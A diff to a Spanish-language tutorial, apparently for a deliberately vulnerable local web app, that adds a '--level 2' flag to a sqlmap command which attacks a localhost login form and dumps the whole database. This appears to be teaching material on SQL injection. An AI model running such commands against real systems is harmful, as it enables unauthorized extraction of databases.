@@ -77,7 +77,7 @@ La consulta SQL anterior devuelve todos los usuarios de la base de datos, ya que
 El siguiente ejemplo hace uso de la herramienta `sqlmap` para obtener información de la base de datos. Es necesario instalar dicha herramienta y ejecutar alguno de los siguientes comandos:
 
 ```bash
-sqlmap -u http://localhost:5000/login --data "username=whatever&password=youwant" --dump-all --schema
+sqlmap -u http://localhost:5000/login --data "username=whatever&password=youwant" --dump-all --schema --level 2
 ```
 
 También se puede utilizar la opción `--wizard` para obtener información de la base de datos de forma asistida.
